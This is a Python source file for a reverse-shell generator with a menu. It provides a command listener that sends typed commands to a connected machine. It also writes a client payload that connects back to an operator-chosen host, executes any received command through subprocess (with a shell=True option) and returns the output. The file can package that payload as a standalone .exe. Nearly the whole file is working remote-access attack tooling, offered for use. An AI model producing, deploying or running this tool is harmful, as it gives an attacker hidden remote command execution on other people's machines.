import socket 
import sys
import subprocess
import os
import time
import shutil


def revshmain(callback):
    print("welcome to reverse shell generator\n")
    print(".\n")
    print("1. Generate tcp client\n")
    print("2. Connect to client\n")
    choice = input("Select: ")

    if choice == "1":
        genClient()
    elif choice == "2":
        connectClient()
    
    pass

def genClient():
    pass

def connectClient():
    socket_create()
    socket_bind()
    socket_accept()


#portp and hostp for listening
def socket_create():
    hostp = input("\nHost: ")
    portp = input("\nPort: ")
    try:
        global host
        global port
        global s
        host = hostp
        port = portp
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("socket create error: " + str(msg))

def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("socket binding error: " + str(msg) + "\n" + "Retrying..")
        socket_bind()

def socket_accept():
    conn, addr = s.accept()
    print("Connection has been established | IP: " + addr[0] + " | Port: " + str(addr[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        command = input("CMD> ")

        if command == 'exit':
            conn.send('exit'.encode("UTF-8"))
            conn.close()
            s.close()
            sys.exit()
        if len(command.encode("UTF-8")) > 0:
            conn.send(command.encode("UTF-8"))
            client_resp = str(conn.recv(4092).decode("UTF-8"))
            print(client_resp, end="")


#portc and addressc for gen client
# def genClient():

#     addressc = input("\nEnter your listener address: ")
#     portc = input("\nEnter your listener port: ") #maybe add a port scanner here
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     s.connect((addressc,portc))
#     Flag = True
#     while Flag:
#         command = s.recv(4092).decode("UTF-8")
#         if command == 'exit':
#             s.close()
#             break

#         else:
#             CMD = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
#             s.send(CMD.stdout)

def genClient():

    addressc = input("\nEnter your listener address: ")
    while True:
        port_input = input("\nEnter your listener port: ")
        try:
            portc = int(port_input)
            break  # Exit loop if conversion to int succeeds
        except ValueError:
            print("Please enter a valid integer for the port.")

    while True:
        shellTrueorFalse = input("\nShell [y or n]: ").strip().lower()
        if shellTrueorFalse in ['y', 'n']:
            shellBool = True if shellTrueorFalse == "y" else False
            break
        else:
            print("Please enter 'y' or 'n'.")

    genClient_code = f"""
import socket
import subprocess

def genClient():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("{addressc}", {portc}))
        print(f"Connected to {addressc}:{portc}")
        
        while True:
            command = s.recv(4092).decode("UTF-8")
            if command == 'exit':
                break

            elif command.strip(): 
                CMD = subprocess.run(command, shell={shellBool}, capture_output=True)
                output = CMD.stdout + CMD.stderr
                s.send(output)

    except socket.error as e:
        print("socket error as: " + e)
    finally:
        s.close()

genClient()
"""

    pyorexe = input("\nGenerate an executable .py file[1] or .exe file[2]: ")

    if pyorexe == "1":
        with open('tcpClient.py', 'w') as file:
            file.write(genClient_code)
        subprocess.run(['chmod', '+x', 'genClient.py'])

    elif pyorexe == "2":
        with open('tcpClient.py', 'w') as file:
            file.write(genClient_code)
        result = subprocess.run(['pyinstaller', '--onefile', '--clean', 'tcpClient.py'])

        if result.returncode == 0:
            # Move the generated executable and clean up
            if os.path.exists('dist/tcpClient.exe'):
                shutil.move('dist/tcpClient.exe', './tcpClient.exe')
                shutil.rmtree('dist')
                shutil.rmtree('build')
                os.remove('tcpClient.spec')
                os.remove('tcpClient.py')
                print("Executable file successfully created.")
            else:
                print("Error: Failed to find generated executable.")
                print(result.stderr)
        else:
            print("Failed to create executable file. Error output:")
            print(result.stderr)
